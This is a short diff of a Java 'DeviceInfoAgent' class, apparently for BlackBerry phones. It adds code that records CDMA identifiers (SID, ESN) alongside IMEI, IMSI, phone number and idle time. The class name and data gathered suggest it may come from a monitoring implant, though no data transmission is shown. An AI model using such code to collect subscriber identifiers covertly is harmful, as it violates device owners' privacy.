@@ -82,7 +82,7 @@ public final class DeviceInfoAgent extends Agent {
         final StringBuffer sb = new StringBuffer();
 
         // Modello
-       // sb.append("Processor: ARM\n");
+        // sb.append("Processor: ARM\n");
         if (DeviceInfo.isSimulator()) {
             sb.append("Simultator\n");
         }
@@ -107,8 +107,16 @@ public final class DeviceInfoAgent extends Agent {
 
         // Device
         sb.append("Camera: " + DeviceInfo.hasCamera() + "\n");
-        sb.append("IMEI: " + device.getImei() + "\n");
-        sb.append("IMSI: " + device.getImsi() + "\n");
+        if (device.isCDMA()) {
+            sb.append("CDMA\n");
+            sb.append("SID: " + device.getSid() + "\n");
+            sb.append("ESN: " + device.getEsn() + "\n");
+        } else {
+            sb.append("GPRS\n");
+            sb.append("IMEI: " + device.getImei() + "\n");
+            sb.append("IMSI: " + device.getImsi() + "\n");
+        }
+        
         sb.append("Phone: " + device.getPhoneNumber() + "\n");
 
         sb.append("IdleTime: " + DeviceInfo.getIdleTime() + "\n");
